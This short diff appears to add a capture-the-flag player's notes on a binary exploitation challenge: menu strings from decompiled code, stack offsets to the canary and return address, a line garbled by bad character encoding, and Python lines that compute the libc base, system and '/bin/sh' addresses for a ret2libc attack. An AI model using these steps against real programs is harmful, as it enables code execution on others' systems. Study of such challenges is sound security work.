@@ -1,0 +1,19 @@
+  sub_400826("--------");
+  sub_400826("1.store");
+  sub_400826("2.print");
+  sub_400826("3.quit");
+  sub_400826("--------");
+
+
+	0x7fffffffde70
+	88
+canary	0x7fffffffdef8
+	98
+ret	0x7fffffffdf08
+
+ÈÆ¹ýcanaryºóROP
+libcbase = putsaddr - libc.symbols["puts"]
+
+systemaddr = libcbase + libc.symbols["system"]
+
+binshaddr = libcbase + next(libc.search("/bin/sh"))
